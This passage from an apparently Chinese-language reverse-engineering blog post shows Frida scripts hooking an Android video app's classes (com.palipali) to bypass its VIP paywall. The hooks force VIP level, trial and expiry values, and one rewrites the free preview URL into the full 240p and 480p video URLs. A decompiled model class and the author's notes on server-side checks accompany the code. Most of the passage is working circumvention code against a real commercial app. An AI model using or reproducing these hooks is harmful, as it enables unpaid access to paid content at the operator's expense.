class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;load &quot;</span> + path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_user</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">User</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseUserInfo&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseUserInfo ...&quot;</span>);</span><br><span class="line">        <span class="comment">// 强制 vipTrial = true</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setVipTrial</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force vipTrial = true&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setVipTrial</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 强制 level = 2</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setLevel</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force level = 2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setLevel</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制 expiry（有效期拉满）</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setExpiry</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force expiry = 9999999999999&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setExpiry</span>(<span class="number">9999999999999</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制试用成功</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setTrialResult</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force trialResult = true&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setTrialResult</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 showVipTime</span></span><br><span class="line">        <span class="title class_">User</span>.<span class="property">setShowVipTime</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIP] force showVipTime = 300&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setShowVipTime</span>(<span class="number">3000</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">User</span>.<span class="property">toString</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[UserInfo] &quot;</span> + ret);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    level        =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getLevel</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    vipTrial     =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getVipTrial</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    expiry       =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getExpiry</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;    trialResult  =&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">getTrialResult</span>());</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hook_dlopen</span>();</span><br><span class="line">    <span class="title function_">hook_user</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>陷入了漫长的寻找</p><p>ResponseUserInfo，可能只改了用户信息，真正用于播放鉴权的是 ik.v（MemberBean）。</p><p>发现黄鸟抓包要全一点</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511211338270.png" alt="image-20251121133808157"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511211654526.png" alt="image-20251121165438371"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511211654721.png" alt="image-20251121165453581"></p><p>这两个类均有video_end和duration类似信息</p><p>先hook了ResponseVideoInfo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_response_vip</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Info</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseVideoInfo...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 video_duration</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">getVideo_duration</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = <span class="variable language_">this</span>.<span class="title function_">getVideo_duration</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] getVideo_duration =&quot;</span>, d);</span><br><span class="line">        <span class="keyword">return</span> d;   <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 video_end</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">getVideo_end</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> end = <span class="variable language_">this</span>.<span class="title function_">getVideo_end</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] getVideo_end =&quot;</span>, end);</span><br><span class="line">        <span class="keyword">return</span> end; <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 setVideo_end</span></span><br><span class="line">    <span class="title class_">Info</span>.<span class="property">setVideo_end</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">v</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[VIDEO] setVideo_end called, value =&quot;</span>, v);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setVideo_end</span>(v);  <span class="comment">// 不修改</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511211656556.png" alt="image-20251121165626439"></p><p>证明其实不该hook这，在这hook也晚了，或者hook的字段不对，然后跟踪字段到这个类</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">palipali</span>.<span class="property">model</span>.<span class="property">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.<span class="property">support</span>.<span class="property">v4</span>.<span class="property">media</span>.<span class="property">d</span>;</span><br><span class="line"><span class="keyword">import</span> bi.<span class="property">t</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">google</span>.<span class="property">gson</span>.<span class="property">annotations</span>.<span class="property">SerializedName</span>;</span><br><span class="line"><span class="keyword">import</span> e2.<span class="property">b</span>;</span><br><span class="line"><span class="keyword">import</span> ib.<span class="property">e</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">Serializable</span>;</span><br><span class="line"><span class="keyword">import</span> miui.<span class="property">telephony</span>.<span class="property">phonenumber</span>.<span class="property">CountryCodeConverter</span>;</span><br><span class="line"><span class="keyword">import</span> ym.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: ResponseVideoUrl.kt */</span></span><br><span class="line"><span class="comment">/* loaded from: E:\Desktop\51f8fb02c9617292c82517301744238c.zip\..\dump\classes16.dex */</span></span><br><span class="line">public final <span class="keyword">class</span> <span class="title class_">ResponseVideoUrl</span> implements <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    @<span class="title class_">SerializedName</span>(<span class="string">&quot;intro&quot;</span>)</span><br><span class="line">    private <span class="title class_">String</span> introUrl;</span><br><span class="line">    @<span class="title class_">SerializedName</span>(<span class="title class_">CountryCodeConverter</span>.<span class="property">GQ</span>)</span><br><span class="line">    private <span class="title class_">String</span> qvgaUrl;</span><br><span class="line">    @<span class="title class_">SerializedName</span>(<span class="string">&quot;480&quot;</span>)</span><br><span class="line">    private <span class="title class_">String</span> vgaUrl;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">ResponseVideoUrl</span>() &#123;</span><br><span class="line">        <span class="title function_">this</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">7</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">ResponseVideoUrl</span>(<span class="title class_">String</span> str, <span class="title class_">String</span> str2, <span class="title class_">String</span> str3) &#123;</span><br><span class="line">        t.<span class="title function_">a</span>(str, <span class="string">&quot;introUrl&quot;</span>, str2, <span class="string">&quot;qvgaUrl&quot;</span>, str3, <span class="string">&quot;vgaUrl&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">introUrl</span> = str;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">qvgaUrl</span> = str2;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">vgaUrl</span> = str3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="title class_">ResponseVideoUrl</span> <span class="title function_">copy$default</span>(<span class="title class_">ResponseVideoUrl</span> responseVideoUrl, <span class="title class_">String</span> str, <span class="title class_">String</span> str2, <span class="title class_">String</span> str3, int i10, <span class="title class_">Object</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i10 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            str = responseVideoUrl.<span class="property">introUrl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i10 &amp; <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            str2 = responseVideoUrl.<span class="property">qvgaUrl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i10 &amp; <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            str3 = responseVideoUrl.<span class="property">vgaUrl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> responseVideoUrl.<span class="title function_">copy</span>(str, str2, str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">component1</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">introUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">component2</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">qvgaUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">component3</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">vgaUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">ResponseVideoUrl</span> <span class="title function_">copy</span>(<span class="params"><span class="built_in">String</span> str, <span class="built_in">String</span> str2, <span class="built_in">String</span> str3</span>) &#123;</span><br><span class="line">        e.<span class="title function_">g</span>(str, <span class="string">&quot;introUrl&quot;</span>);</span><br><span class="line">        e.<span class="title function_">g</span>(str2, <span class="string">&quot;qvgaUrl&quot;</span>);</span><br><span class="line">        e.<span class="title function_">g</span>(str3, <span class="string">&quot;vgaUrl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseVideoUrl</span>(str, str2, str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public boolean <span class="title function_">equals</span>(<span class="params"><span class="built_in">Object</span> obj</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> <span class="title class_">ResponseVideoUrl</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">ResponseVideoUrl</span> responseVideoUrl = (<span class="title class_">ResponseVideoUrl</span>) obj;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">b</span>(<span class="variable language_">this</span>.<span class="property">introUrl</span>, responseVideoUrl.<span class="property">introUrl</span>) &amp;&amp; e.<span class="title function_">b</span>(<span class="variable language_">this</span>.<span class="property">qvgaUrl</span>, responseVideoUrl.<span class="property">qvgaUrl</span>) &amp;&amp; e.<span class="title function_">b</span>(<span class="variable language_">this</span>.<span class="property">vgaUrl</span>, responseVideoUrl.<span class="property">vgaUrl</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">getIntroUrl</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">introUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">getQvgaUrl</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">qvgaUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="title class_">String</span> <span class="title function_">getVgaUrl</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">vgaUrl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int <span class="title function_">hashCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">vgaUrl</span>.<span class="title function_">hashCode</span>() + g1.<span class="property">e</span>.<span class="title function_">a</span>(<span class="variable language_">this</span>.<span class="property">qvgaUrl</span>, <span class="variable language_">this</span>.<span class="property">introUrl</span>.<span class="title function_">hashCode</span>() * <span class="number">31</span>, <span class="number">31</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="keyword">void</span> <span class="title function_">setIntroUrl</span>(<span class="params"><span class="built_in">String</span> str</span>) &#123;</span><br><span class="line">        e.<span class="title function_">g</span>(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">introUrl</span> = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="keyword">void</span> <span class="title function_">setQvgaUrl</span>(<span class="params"><span class="built_in">String</span> str</span>) &#123;</span><br><span class="line">        e.<span class="title function_">g</span>(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">qvgaUrl</span> = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public final <span class="keyword">void</span> <span class="title function_">setVgaUrl</span>(<span class="params"><span class="built_in">String</span> str</span>) &#123;</span><br><span class="line">        e.<span class="title function_">g</span>(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">vgaUrl</span> = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">StringBuilder</span> a10 = d.<span class="title function_">a</span>(<span class="string">&quot;ResponseVideoUrl(introUrl=&quot;</span>);</span><br><span class="line">        a10.<span class="title function_">mo3321append</span>(<span class="variable language_">this</span>.<span class="property">introUrl</span>);</span><br><span class="line">        a10.<span class="title function_">mo3321append</span>(<span class="string">&quot;, qvgaUrl=&quot;</span>);</span><br><span class="line">        a10.<span class="title function_">mo3321append</span>(<span class="variable language_">this</span>.<span class="property">qvgaUrl</span>);</span><br><span class="line">        a10.<span class="title function_">mo3321append</span>(<span class="string">&quot;, vgaUrl=&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> b.<span class="title function_">a</span>(a10, <span class="variable language_">this</span>.<span class="property">vgaUrl</span>, <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="comment">/* synthetic */</span> <span class="title class_">ResponseVideoUrl</span>(<span class="title class_">String</span> str, <span class="title class_">String</span> str2, <span class="title class_">String</span> str3, int i10, f fVar) &#123;</span><br><span class="line">        <span class="title function_">this</span>((i10 &amp; <span class="number">1</span>) != <span class="number">0</span> ? <span class="string">&quot;&quot;</span> : str, (i10 &amp; <span class="number">2</span>) != <span class="number">0</span> ? <span class="string">&quot;&quot;</span> : str2, (i10 &amp; <span class="number">4</span>) != <span class="number">0</span> ? <span class="string">&quot;&quot;</span> : str3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>字段</th><th>含义</th><th>可能内容</th></tr></thead><tbody><tr><td><code>introUrl</code></td><td>试看&#x2F;简介视频（通常几十秒 → 限制版）</td><td>60 秒试看</td></tr><tr><td><code>qvgaUrl</code></td><td>低清视频（完整）</td><td>240P 正片</td></tr><tr><td><code>vgaUrl</code></td><td>标清视频（完整）</td><td>480P 正片</td></tr></tbody></table><p>看了下免费的：</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511211717440.png" alt="image-20251121171715328"></p><p>写了个新的hook方法</p><p>因为1分钟短片是intro</p><p>qvga是240p</p><p>vga是480p</p><p>我看了免费的验证了这之间只差一个参数，因此获取intro之后可以重新拼接，只要再给vga或qvag即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_response_url</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Url</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.palipali.model.response.ResponseVideoUrl&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hooking ResponseVideoUrl with auto full URL...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> url_240 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> url_480 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getIntroUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> intro = <span class="variable language_">this</span>.<span class="title function_">getIntroUrl</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] intro =&quot;</span>, intro);</span><br><span class="line">        <span class="keyword">var</span> filename = intro.<span class="title function_">substring</span>(intro.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] extracted filename =&quot;</span>, filename);</span><br><span class="line"></span><br><span class="line">        url_240 = <span class="string">&quot;/media/240/&quot;</span> + filename;</span><br><span class="line">        url_480 = <span class="string">&quot;/media/480/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] FULL video =&quot;</span>, url_240);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] FULL video 480  =&quot;</span>, url_480);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setQvgaUrl</span>(url_240);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setVgaUrl</span>(url_480);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] qvgaUrl overridden to FULL&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> intro; </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getQvgaUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> q = <span class="variable language_">this</span>.<span class="title function_">getQvgaUrl</span>();</span><br><span class="line">        <span class="keyword">if</span> (url_240) q = url_240;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] qvga =&quot;</span>, q);</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Url</span>.<span class="property">getVgaUrl</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vga = <span class="variable language_">this</span>.<span class="title function_">getVgaUrl</span>();</span><br><span class="line">        <span class="keyword">if</span> (url_480) vga = url_480;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[URL] vga =&quot;</span>, vga);</span><br><span class="line">        <span class="keyword">return</span> vga;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这个方法只是治标不治本，根本上还得分析谁调用了video，因为什么信息才导致不是vip，之前的hook_user用不了</p></blockquote><p>分析了下，这个是后端校验为主</p><p>Hook 改写的是：</p><ul><li><code>ResponseUserInfo.level</code></li><li><code>isVip</code></li><li><code>video_end</code></li><li><code>ResponseVideoUrl</code></li></ul><p>这些都只是 <strong>本地数据模型</strong>。</p><p>但 app 一旦执行需要写入服务器的操作，例如：</p><ul><li>收藏视频（POST 请求）</li><li>取消收藏（DELETE）</li><li>点赞视频</li><li>评论</li></ul><p>这些都是发请求给服务器的。</p><p>服务器当然不会根据你本地代码判断你是不是 VIP，它根据：</p><p>服务器数据库真正记录的账号状态</p><p>如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">  <span 